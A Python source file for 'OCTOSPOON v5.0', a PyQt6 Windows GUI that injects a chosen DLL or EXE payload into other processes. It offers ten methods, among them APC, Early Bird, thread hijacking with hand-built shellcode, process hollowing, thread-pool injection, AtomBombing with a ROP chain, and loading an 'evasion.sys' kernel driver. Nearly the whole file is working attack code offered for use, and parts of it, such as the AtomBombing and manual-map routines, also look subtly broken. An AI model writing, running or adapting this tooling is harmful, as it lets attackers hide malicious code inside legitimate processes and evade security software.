# octospoon_gui.py - OCTOSPOON v5.0 FULL GUI + ALL 10 INJECTIONS
import sys
import os
import ctypes
import struct
import subprocess
import psutil
from ctypes import wintypes, windll, POINTER, sizeof, c_void_p, c_char
from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QLabel, QComboBox, QPushButton, QTextEdit, QFileDialog,
    QListWidget, QSplitter, QMessageBox, QProgressBar
)
from PyQt6.QtCore import Qt, QThread, pyqtSignal
from PyQt6.QtGui import QFont, QIcon

# === WinAPI ===
kernel32 = windll.kernel32
ntdll = windll.ntdll
psapi = windll.psapi

PROCESS_ALL_ACCESS = 0x1F0FFF
THREAD_ALL_ACCESS = 0x1F03FF
MEM_COMMIT_RESERVE = 0x3000
PAGE_EXECUTE_READWRITE = 0x40
PAGE_READWRITE = 0x04
INFINITE = 0xFFFFFFFF
CREATE_SUSPENDED = 0x4

# === Structures ===
class STARTUPINFO(ctypes.Structure):
    _fields_ = [("cb", wintypes.DWORD), ("lpReserved", wintypes.LPSTR), ("lpDesktop", wintypes.LPSTR),
                ("lpTitle", wintypes.LPSTR), ("dwX", wintypes.DWORD), ("dwY", wintypes.DWORD),
                ("dwXSize", wintypes.DWORD), ("dwYSize", wintypes.DWORD), ("dwXCountChars", wintypes.DWORD),
                ("dwYCountChars", wintypes.DWORD), ("dwFillAttribute", wintypes.DWORD),
                ("dwFlags", wintypes.DWORD), ("wShowWindow", wintypes.WORD),
                ("cbReserved2", wintypes.WORD), ("lpReserved2", wintypes.LPBYTE),
                ("hStdInput", wintypes.HANDLE), ("hStdOutput", wintypes.HANDLE),
                ("hStdError", wintypes.HANDLE)]

class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [("hProcess", wintypes.HANDLE), ("hThread", wintypes.HANDLE),
                ("dwProcessId", wintypes.DWORD), ("dwThreadId", wintypes.DWORD)]

class CONTEXT(ctypes.Structure):
    _fields_ = [
        ("P1Home", wintypes.ULONG64), ("P2Home", wintypes.ULONG64), ("P3Home", wintypes.ULONG64),
        ("P4Home", wintypes.ULONG64), ("P5Home", wintypes.ULONG64), ("P6Home", wintypes.ULONG64),
        ("ContextFlags", wintypes.DWORD), ("MxCsr", wintypes.DWORD),
        ("SegCs", wintypes.WORD), ("SegDs", wintypes.WORD), ("SegEs", wintypes.WORD),
        ("SegFs", wintypes.WORD), ("SegGs", wintypes.WORD), ("SegSs", wintypes.WORD),
        ("EFlags", wintypes.DWORD),
        ("Dr0", wintypes.ULONG64), ("Dr1", wintypes.ULONG64), ("Dr2", wintypes.ULONG64),
        ("Dr3", wintypes.ULONG64), ("Dr6", wintypes.ULONG64), ("Dr7", wintypes.ULONG64),
        ("Rax", wintypes.ULONG64), ("Rcx", wintypes.ULONG64), ("Rdx", wintypes.ULONG64),
        ("Rbx", wintypes.ULONG64), ("Rsp", wintypes.ULONG64), ("Rbp", wintypes.ULONG64),
        ("Rsi", wintypes.ULONG64), ("Rdi", wintypes.ULONG64), ("R8", wintypes.ULONG64),
        ("R9", wintypes.ULONG64), ("R10", wintypes.ULONG64), ("R11", wintypes.ULONG64),
        ("R12", wintypes.ULONG64), ("R13", wintypes.ULONG64), ("R14", wintypes.ULONG64),
        ("R15", wintypes.ULONG64),
        ("Rip", wintypes.ULONG64),
    ]

# === Injection Worker ===
class InjectorThread(QThread):
    log_signal = pyqtSignal(str)
    done_signal = pyqtSignal(str)

    def __init__(self, method, pid=None, dll_path=None, exe_path=None):
        super().__init__()
        self.method = method
        self.pid = pid
        self.dll_path = dll_path
        self.exe_path = exe_path

    def log(self, msg): self.log_signal.emit(f"[OCTOSPOON] {msg}")
    def error(self, msg): self.log_signal.emit(f"[!] {msg}")

    def run(self):
        try:
            getattr(self, f"{self.method.lower().replace(' ', '_')}_injection")()
            self.done_signal.emit(f"{self.method} complete.")
        except Exception as e:
            self.error(f"Failed: {e}")

    # === 1. Standard ===
    def standard_injection(self):
        self.log("Standard Injection")
        h = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, self.pid)
        path = self.dll_path.encode('ascii') + b'\x00'
        mem = kernel32.VirtualAllocEx(h, None, len(path), MEM_COMMIT_RESERVE, PAGE_READWRITE)
        kernel32.WriteProcessMemory(h, mem, path, len(path), None)
        loadlib = kernel32.GetProcAddress(kernel32.GetModuleHandleW("kernel32.dll"), b"LoadLibraryA")
        ht = kernel32.CreateRemoteThread(h, None, 0, loadlib, mem, 0, None)
        kernel32.WaitForSingleObject(ht, INFINITE)
        kernel32.CloseHandle(ht); kernel32.CloseHandle(h)
        self.log("Injected")

    # === 2. APC ===
    def apc_injection(self):
        self.log("APC Injection")
        h = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, self.pid)
        path = self.dll_path.encode('ascii') + b'\x00'
        mem = kernel32.VirtualAllocEx(h, None, len(path), MEM_COMMIT_RESERVE, PAGE_READWRITE)
        kernel32.WriteProcessMemory(h, mem, path, len(path), None)
        loadlib = kernel32.GetProcAddress(kernel32.GetModuleHandleW("kernel32.dll"), b"LoadLibraryA")
        queued = 0
        for t in psutil.Process(self.pid).threads():
            ht = kernel32.OpenThread(THREAD_ALL_ACCESS, False, t.id)
            if ht and kernel32.QueueUserAPC(loadlib, ht, mem): queued += 1
            if ht: kernel32.CloseHandle(ht)
        kernel32.CloseHandle(h)
        self.log(f"Queued on {queued} threads")

    # === 3. Early Bird ===
    def early_bird_injection(self):
        self.log("Early Bird APC")
        si = STARTUPINFO(); pi = PROCESS_INFORMATION(); si.cb = sizeof(si)
        if not kernel32.CreateProcessW(self.exe_path, None, None, None, False, CREATE_SUSPENDED, None, None, ctypes.byref(si), ctypes.byref(pi)):
            return self.error("CreateProcess failed")
        h = pi.hProcess
        path = self.dll_path.encode('ascii') + b'\x00'
        mem = kernel32.VirtualAllocEx(h, None, len(path), MEM_COMMIT_RESERVE, PAGE_READWRITE)
        kernel32.WriteProcessMemory(h, mem, path, len(path), None)
        loadlib = kernel32.GetProcAddress(kernel32.GetModuleHandleW("kernel32.dll"), b"LoadLibraryA")
        kernel32.QueueUserAPC(loadlib, pi.hThread, mem)
        kernel32.ResumeThread(pi.hThread)
        self.log("Resumed")

    # === 4. Thread Hijack ===
    def thread_hijack_injection(self):
        self.log("Thread Hijack")
        h = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, self.pid)
        path = self.dll_path.encode('ascii') + b'\x00'
        mem = kernel32.VirtualAllocEx(h, None, len(path), MEM_COMMIT_RESERVE, PAGE_READWRITE)
        kernel32.WriteProcessMemory(h, mem, path, len(path), None)
        loadlib = kernel32.GetProcAddress(kernel32.GetModuleHandleW("kernel32.dll"), b"LoadLibraryA")
        shellcode = (
            b"\x48\x83\xEC\x28" +
            b"\x48\xB9" + struct.pack("<Q", mem) +
            b"\x48\xB8" + struct.pack("<Q", loadlib) +
            b"\xFF\xD0" +
            b"\x48\x83\xC4\x28" +
            b"\xC3"
        )
        code = kernel32.VirtualAllocEx(h, None, len(shellcode), MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)
        kernel32.WriteProcessMemory(h, code, shellcode, len(shellcode), None)
        for t in psutil.Process(self.pid).threads():
            ht = kernel32.OpenThread(THREAD_ALL_ACCESS, False, t.id)
            if ht:
                ctx = CONTEXT(); ctx.ContextFlags = 0x100000
                kernel32.GetThreadContext(ht, ctypes.byref(ctx))
                ctx.Rip = code
                kernel32.SetThreadContext(ht, ctypes.byref(ctx))
                kernel32.ResumeThread(ht)
                kernel32.CloseHandle(ht)
                break
        kernel32.CloseHandle(h)
        self.log("Hijacked")

    # === 5. Reflective ===
    def reflective_injection(self):
        self.log("Reflective DLL")
        with open(self.dll_path, "rb") as f: dll = f.read()
        e_lfanew = struct.unpack("<I", dll[0x3C:0x40])[0]
        entry_rva = struct.unpack("<I", dll[e_lfanew + 0x28:e_lfanew + 0x2C])[0]
        h = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, self.pid)
        base = kernel32.VirtualAllocEx(h, None, len(dll), MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)
        kernel32.WriteProcessMemory(h, base, dll, len(dll), None)
        entry = base + entry_rva
        ht = kernel32.CreateRemoteThread(h, None, 0, entry, 0, 0, None)
        kernel32.WaitForSingleObject(ht, INFINITE)
        kernel32.CloseHandle(ht); kernel32.CloseHandle(h)
        self.log("Executed")

    # === 6. Manual Map ===
    def manual_map_injection(self):
        self.log("Manual Map")
        with open(self.dll_path, "rb") as f: dll = f.read()
        h = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, self.pid)
        section = ntdll.NtCreateSection(0, 0x10000000, None, None, 0x4, 0x8000000, None)
        local_base = wintypes.HANDLE(); remote_base = wintypes.HANDLE()
        size = wintypes.ULARGE_INTEGER(len(dll))
        ntdll.NtMapViewOfSection(section, kernel32.GetCurrentProcess(), ctypes.byref(local_base), 0, 0, None, ctypes.byref(size), 1, 0, 0x4)
        ctypes.memmove(local_base.value, dll, len(dll))
        ntdll.NtMapViewOfSection(section, h, ctypes.byref(remote_base), 0, 0, None, ctypes.byref(size), 1, 0, 0x40)
        self.log(f"Mapped at 0x{remote_base.value:X}")
        kernel32.CloseHandle(h)

    # === 7. Process Hollowing ===
    def process_hollowing_injection(self):
        self.log("Process Hollowing")
        si = STARTUPINFO(); pi = PROCESS_INFORMATION(); si.cb = sizeof(si)
        kernel32.CreateProcessW(self.exe_path, None, None, None, False, CREATE_SUSPENDED, None, None, ctypes.byref(si), ctypes.byref(pi))
        with open(self.dll_path, "rb") as f: pe_data = f.read()
        e_lfanew = struct.unpack("<I", pe_data[60:64])[0]
        image_base = struct.unpack("<Q", pe_data[e_lfanew+0x30:e_lfanew+0x38])[0]
        size_of_image = struct.unpack("<I", pe_data[e_lfanew+0x50:e_lfanew+0x54])[0]
        ntdll.NtUnmapViewOfSection(pi.hProcess, image_base)
        new_base = kernel32.VirtualAllocEx(pi.hProcess, image_base, size_of_image, MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)
        if not new_base: new_base = kernel32.VirtualAllocEx(pi.hProcess, None, size_of_image, MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)
        kernel32.WriteProcessMemory(pi.hProcess, new_base, pe_data, 0x1000, None)
        for i in range(struct.unpack("<H", pe_data[e_lfanew+0x06:e_lfanew+0x08])[0]):
            sec = pe_data[e_lfanew+0xF8 + i*40 : e_lfanew+0xF8 + (i+1)*40]
            ptr = struct.unpack("<I", sec[20:24])[0]
            size = struct.unpack("<I", sec[16:20])[0]
            dest = new_base + ptr
            kernel32.WriteProcessMemory(pi.hProcess, dest, pe_data[ptr:ptr+size], size, None)
        ctx = CONTEXT(); ctx.ContextFlags = 0x100000
        kernel32.GetThreadContext(pi.hThread, ctypes.byref(ctx))
        kernel32.WriteProcessMemory(pi.hProcess, ctx.Rcx + 0x10, struct.pack("<Q", new_base + struct.unpack("<I", pe_data[e_lfanew+0x28:e_lfanew+0x2C])[0]), 8, None)
        ctx.Rip = new_base + struct.unpack("<I", pe_data[e_lfanew+0x28:e_lfanew+0x2C])[0]
        kernel32.SetThreadContext(pi.hThread, ctypes.byref(ctx))
        kernel32.ResumeThread(pi.hThread)
        self.log("Hollowed & resumed")

    # === 8. Thread Pool ===
    def thread_pool_injection(self):
        self.log("Thread Pool Injection")
        h = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, self.pid)
        ntdll = ctypes.WinDLL('ntdll')
        TpAllocPool = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p)(('TpAllocPool', ntdll))
        TpAllocWork = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p)(('TpAllocWork', ntdll))
        TpPostWork = ctypes.WINFUNCTYPE(None, ctypes.c_void_p)(('TpPostWork', ntdll))
        remote_path = kernel32.VirtualAllocEx(h, None, 260, MEM_COMMIT_RESERVE, PAGE_READWRITE)
        path_bytes = self.dll_path.encode('utf-16le') + b'\x00\x00'
        kernel32.WriteProcessMemory(h, remote_path, path_bytes, len(path_bytes), None)
        loadlib = kernel32.GetProcAddress(kernel32.GetModuleHandleW("kernel32.dll"), b"LoadLibraryW")
        shellcode = (
            b"\x48\x83\xEC\x28" +
            b"\x48\xB9" + struct.pack("<Q", remote_path) +
            b"\x48\xB8" + struct.pack("<Q", loadlib) +
            b"\xFF\xD0" +
            b"\x48\x83\xC4\x28" +
            b"\xC3"
        )
        remote_code = kernel32.VirtualAllocEx(h, None, len(shellcode), MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)
        kernel32.WriteProcessMemory(h, remote_code, shellcode, len(shellcode), None)
        remote_pool = kernel32.VirtualAllocEx(h, None, 8, MEM_COMMIT_RESERVE, PAGE_READWRITE)
        remote_work = kernel32.VirtualAllocEx(h, None, 8, MEM_COMMIT_RESERVE, PAGE_READWRITE)
        shell_tp = (b"\x48\xB9" + struct.pack("<Q", remote_pool) + b"\x48\xC7\xC2\x00\x00\x00\x00" +
                    b"\x48\xB8" + struct.pack("<Q", ntdll.TpAllocPool.address) + b"\xFF\xD0" + b"\xC3")
        remote_tp = kernel32.VirtualAllocEx(h, None, len(shell_tp), MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)
        kernel32.WriteProcessMemory(h, remote_tp, shell_tp, len(shell_tp), None)
        ht = kernel32.CreateRemoteThread(h, None, 0, remote_tp, 0, 0, None)
        kernel32.WaitForSingleObject(ht, INFINITE); kernel32.CloseHandle(ht)
        pool_ptr = wintypes.HANDLE()
        kernel32.ReadProcessMemory(h, remote_pool, ctypes.byref(pool_ptr), 8, None)
        shell_work = (b"\x48\xB9" + struct.pack("<Q", pool_ptr.value) + b"\x48\xBA" + struct.pack("<Q", remote_code) +
                      b"\x48\xC7\xC1\x00\x00\x00\x00" + b"\x4D\x31\xC9" +
                      b"\x48\xB8" + struct.pack("<Q", ntdll.TpAllocWork.address) + b"\xFF\xD0" + b"\x48\x89\x02" + b"\xC3")
        remote_work_alloc = kernel32.VirtualAllocEx(h, None, len(shell_work), MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)
        kernel32.WriteProcessMemory(h, remote_work_alloc, shell_work, len(shell_work), None)
        ht = kernel32.CreateRemoteThread(h, None, 0, remote_work_alloc, remote_work, 0, None)
        kernel32.WaitForSingleObject(ht, INFINITE); kernel32.CloseHandle(ht)
        work_ptr = wintypes.HANDLE()
        kernel32.ReadProcessMemory(h, remote_work, ctypes.byref(work_ptr), 8, None)
        shell_post = (b"\x48\xB9" + struct.pack("<Q", work_ptr.value) +
                      b"\x48\xB8" + struct.pack("<Q", ntdll.TpPostWork.address) + b"\xFF\xD0" + b"\xC3")
        remote_post = kernel32.VirtualAllocEx(h, None, len(shell_post), MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)
        kernel32.WriteProcessMemory(h, remote_post, shell_post, len(shell_post), None)
        ht = kernel32.CreateRemoteThread(h, None, 0, remote_post, 0, 0, None)
        kernel32.WaitForSingleObject(ht, INFINITE); kernel32.CloseHandle(ht)
        self.log("Thread pool work posted"); kernel32.CloseHandle(h)

    # === 9. Kernel Driver ===
    def kernel_driver_injection(self):
        self.log("Loading evasion.sys")
        driver_path = os.path.abspath("drivers/evasion.sys")
        if not os.path.exists(driver_path):
            return self.error("evasion.sys not found. Run build_driver.py")
        subprocess.run(f'sc create octospoon binPath= "{driver_path}" type= kernel', shell=True)
        subprocess.run('sc start octospoon', shell=True)
        self.log("Driver active")

    # === 10. AtomBombing ===
    def atombombing_injection(self):
        self.log("AtomBombing Injection")
        h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, self.pid)
        if not h_process: return self.error("OpenProcess failed")
        dll_bytes = self.dll_path.encode('ascii') + b'\x00'
        loadlib_addr = kernel32.GetProcAddress(kernel32.GetModuleHandleW("kernel32.dll"), b"LoadLibraryA")
        shellcode = (
            b"\x48\x83\xEC\x28" +
            b"\x48\xB9" + struct.pack("<Q", ctypes.cast(dll_bytes, ctypes.c_void_p).value) +
            b"\x48\xB8" + struct.pack("<Q", loadlib_addr) +
            b"\xFF\xD0" +
            b"\x48\x83\xC4\x28" +
            b"\xC3"
        )
        atom_ids = []
        offset = 0
        while offset < len(shellcode):
            chunk = shellcode[offset:offset+255]
            atom_name = chunk + b'\x00' * (255 - len(chunk))
            atom_id = kernel32.GlobalAddAtomW(atom_name)
            if not atom_id: return self.error("GlobalAddAtom failed")
            atom_ids.append(atom_id)
            offset += 255
        self.log(f"Smuggled {len(shellcode)} bytes via {len(atom_ids)} atoms")
        shell_mem = kernel32.VirtualAllocEx(h_process, None, len(shellcode), MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)

        def find_gadget(pattern):
            modules = (wintypes.HMODULE * 1024)()
            needed = wintypes.DWORD()
            psapi.EnumProcessModules(h_process, modules, sizeof(modules), ctypes.byref(needed))
            for hmod in modules:
                if not hmod: break
                name = (ctypes.c_char * 260)()
                psapi.GetModuleFileNameExA(h_process, hmod, name, 260)
                if b"kernelbase.dll" in name.value.lower():
                    info = type('MODULEINFO', (), {})()
                    info.lpBaseOfDll = wintypes.HMODULE()
                    info.SizeOfImage = wintypes.DWORD()
                    psapi.GetModuleInformation(h_process, hmod, ctypes.byref(info), sizeof(info))
                    data = (ctypes.c_char * info.SizeOfImage)()
                    kernel32.ReadProcessMemory(h_process, info.lpBaseOfDll, data, info.SizeOfImage, None)
                    raw = ctypes.string_at(data, info.SizeOfImage)
                    pos = raw.find(pattern)
                    if pos != -1: return info.lpBaseOfDll + pos
            return None

        pop_rax_ret = find_gadget(b"\x58\xc3")
        jmp_rax = find_gadget(b"\xff\xe0")
        if not all([pop_rax_ret, jmp_rax]): return self.error("Gadget not found")

        retrieve_code = b""
        dest = shell_mem
        for atom_id in atom_ids:
            retrieve_code += (
                b"\x48\xB9" + struct.pack("<Q", atom_id) +
                b"\x48\xBA" + struct.pack("<Q", dest) +
                b"\x48\xB8" + struct.pack("<Q", kernel32.GlobalGetAtomNameW) +
                b"\xFF\xD0" +
                b"\x48\x83\xC2\xFF"
            )
            dest += 255
        retrieve_code += (b"\x48\xB8" + struct.pack("<Q", shell_mem) + b"\xFF\xE0")

        retrieve_mem = kernel32.VirtualAllocEx(h_process, None, len(retrieve_code), MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)
        kernel32.WriteProcessMemory(h_process, retrieve_mem, retrieve_code, len(retrieve_code), None)

        rop_chain = struct.pack("<Q", pop_rax_ret) + b"A"*8 + struct.pack("<Q", retrieve_mem) + struct.pack("<Q", jmp_rax)
        rop_mem = kernel32.VirtualAllocEx(h_process, None, len(rop_chain), MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)
        kernel32.WriteProcessMemory(h_process, rop_mem, rop_chain, len(rop_chain), None)

        h_thread = kernel32.OpenThread(THREAD_ALL_ACCESS, False, psutil.Process(self.pid).threads()[0].id)
        ctx = CONTEXT()
        ctx.ContextFlags = 0x100000
        ctx.Rip = rop_mem
        ctx.Rsp = shell_mem + 0x1000
        ctx_mem = kernel32.VirtualAllocEx(h_process, None, sizeof(CONTEXT), MEM_COMMIT_RESERVE, PAGE_READWRITE)
        kernel32.WriteProcessMemory(h_process, ctx_mem, ctypes.byref(ctx), sizeof(CONTEXT), None)

        nt_queue_apc = ntdll.NtQueueApcThread
        nt_queue_apc.argtypes = [wintypes.HANDLE, c_void_p, c_void_p, c_void_p, wintypes.ULONG]
        status = nt_queue_apc(h_thread, ntdll.NtContinue, ctx_mem, None, 0)

        self.log("APC queued" if status == 0 else f"Failed: 0x{status:X}")
        kernel32.CloseHandle(h_thread); kernel32.CloseHandle(h_process)
        for atom_id in atom_ids: kernel32.GlobalDeleteAtom(atom_id)

# === GUI ===
class OctoSpoonGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("OCTOSPOON v5.0")
        self.setGeometry(100, 100, 1000, 650)
        self.setStyleSheet("background-color: #1a1a1a; color: #e0e0e0; font-family: Consolas;")
        self.init_ui()

    def init_ui(self):
        central = QWidget()
        self.setCentralWidget(central)
        layout = QVBoxLayout(central)

        # Title
        title = QLabel("OCTOSPOON v5.0")
        title.setAlignment(Qt.AlignmentFlag.AlignCenter)
        title.setFont(QFont("Consolas", 20, QFont.Weight.Bold))
        title.setStyleSheet("color: #00ff41; margin: 15px;")
        layout.addWidget(title)

        splitter = QSplitter()
        layout.addWidget(splitter)

        # Left Panel
        left = QWidget()
        left_layout = QVBoxLayout(left)

        # Method
        m_layout = QHBoxLayout()
        m_layout.addWidget(QLabel("Method:"))
        self.method_combo = QComboBox()
        self.method_combo.addItems([
            "Standard", "APC", "Early Bird", "Thread Hijack",
            "Reflective", "Manual Map", "Process Hollowing",
            "Thread Pool", "Kernel Driver", "AtomBombing"
        ])
        m_layout.addWidget(self.method_combo)
        left_layout.addLayout(m_layout)

        # Target
        t_layout = QHBoxLayout()
        t_layout.addWidget(QLabel("Target:"))
        self.pid_list = QListWidget()
        self.pid_list.setMaximumHeight(180)
        self.refresh_btn = QPushButton("Refresh")
        self.refresh_btn.clicked.connect(self.refresh_pids)
        t_layout.addWidget(self.pid_list)
        t_layout.addWidget(self.refresh_btn)
        left_layout.addLayout(t_layout)

        # Payload
        p_layout = QHBoxLayout()
        p_layout.addWidget(QLabel("Payload:"))
        self.payload_label = QLabel("No file")
        self.payload_label.setStyleSheet("color: #888;")
        self.browse_btn = QPushButton("Browse")
        self.browse_btn.clicked.connect(self.browse_payload)
        p_layout.addWidget(self.payload_label)
        p_layout.addWidget(self.browse_btn)
        left_layout.addLayout(p_layout)

        # Progress
        self.progress = QProgressBar()
        self.progress.setVisible(False)
        left_layout.addWidget(self.progress)

        # Inject
        self.inject_btn = QPushButton("INJECT")
        self.inject_btn.setStyleSheet("""
            QPushButton {
                background-color: #00ff41; color: black; font-weight: bold;
                padding: 14px; border-radius: 8px; font-size: 16px;
            }
            QPushButton:hover { background-color: #00cc33; }
            QPushButton:pressed { background-color: #009922; }
        """)
        self.inject_btn.clicked.connect(self.start_injection)
        left_layout.addWidget(self.inject_btn)

        splitter.addWidget(left)

        # Log
        self.log_box = QTextEdit()
        self.log_box.setReadOnly(True)
        self.log_box.setStyleSheet("background-color: #0d0d0d; font-family: Consolas; padding: 10px;")
        splitter.addWidget(self.log_box)

        splitter.setSizes([350, 650])
        self.refresh_pids()

    def log(self, msg):
        self.log_box.append(msg)
        self.log_box.verticalScrollBar().setValue(self.log_box.verticalScrollBar().maximum())

    def refresh_pids(self):
        self.pid_list.clear()
        for p in psutil.process_iter(['pid', 'name']):
            try:
                if p.info['pid'] > 50:
                    self.pid_list.addItem(f"[{p.info['pid']:5}] {p.info['name']}")
            except: pass

    def browse_payload(self):
        path, _ = QFileDialog.getOpenFileName(self, "Select Payload", "", "DLL/EXE (*.dll *.exe)")
        if path:
            self.payload_label.setText(os.path.basename(path))
            self.payload_label.full_path = path

    def start_injection(self):
        if not ctypes.windll.shell32.IsUserAnAdmin():
            QMessageBox.critical(self, "Error", "Run as Administrator!")
            return

        method = self.method_combo.currentText()
        if method in ["Early Bird", "Process Hollowing"]:
            exe_path, _ = QFileDialog.getOpenFileName(self, "Select Host EXE", "", "EXE (*.exe)")
            if not exe_path: return
            dll_path = getattr(self.payload_label, "full_path", None)
            if not dll_path: return
            pid = None
        elif method == "Kernel Driver":
            pid = dll_path = exe_path = None
        else:
            item = self.pid_list.currentItem()
            if not item: return QMessageBox.warning(self, "Error", "Select target")
            pid = int(item.text().split(']')[0][1:].strip())
            dll_path = getattr(self.payload_label, "full_path", None)
            if not dll_path and method != "Kernel Driver":
                return QMessageBox.warning(self, "Error", "Select payload")
            exe_path = None

        self.inject_btn.setEnabled(False)
        self.progress.setVisible(True)
        self.progress.setRange(0, 0)
        self.thread = InjectorThread(method, pid, dll_path, exe_path)
        self.thread.log_signal.connect(self.log)
        self.thread.done_signal.connect(self.injection_done)
        self.thread.start()

    def injection_done(self, msg):
        self.progress.setVisible(False)
        self.inject_btn.setEnabled(True)
        self.log(msg)

# === Run ===
if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = OctoSpoonGUI()
    window.show()
    sys.exit(app.exec())